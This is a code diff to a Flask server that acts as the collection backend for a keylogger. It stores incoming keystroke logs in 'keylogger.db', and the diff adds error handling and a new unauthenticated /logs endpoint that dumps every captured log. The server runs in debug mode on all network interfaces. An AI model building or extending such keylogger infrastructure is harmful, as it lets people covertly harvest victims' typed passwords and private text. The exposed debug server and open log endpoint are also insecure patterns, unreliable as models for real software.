@@ -13,12 +13,16 @@ def create_db():
     conn.close()
 
 def save_log_to_db(log_data):
-    conn = sqlite3.connect('keylogger.db')
-    c = conn.cursor()
-    c.execute("INSERT INTO logs (timestamp, log_data) VALUES (?, ?)",
-              (datetime.datetime.now(), log_data))
-    conn.commit()
-    conn.close()
+    try:
+        conn = sqlite3.connect('keylogger.db')
+        c = conn.cursor()
+        c.execute("INSERT INTO logs (timestamp, log_data) VALUES (?, ?)",
+                  (datetime.datetime.now(), log_data))
+        conn.commit()
+    except sqlite3.Error as e:
+        print(f"Error saving log to database: {e}")
+    finally:
+        conn.close()
 
 @app.route('/log', methods=['POST'])
 def log_key():
@@ -30,7 +34,17 @@ def log_key():
         return jsonify({"status": "success", "message": "Log saved!"}), 200
     else:
         return jsonify({"status": "error", "message": "No log data provided!"}), 400
+    
+@app.route('/logs', methods=['GET'])
+def get_logs():
+    conn = sqlite3.connect('keylogger.db')
+    c = conn.cursor()
+    c.execute("SELECT * FROM logs")
+    logs = c.fetchall()
+    conn.close()
+    return jsonify(logs)
+
 
 if __name__ == '__main__':
-    create_db()  
-    app.run(debug=True, host="0.0.0.0", port=5000)
+    create_db()  # Create the database if it doesn't exist
+    app.run(debug=True, host="0.0.0.0", port=5008)
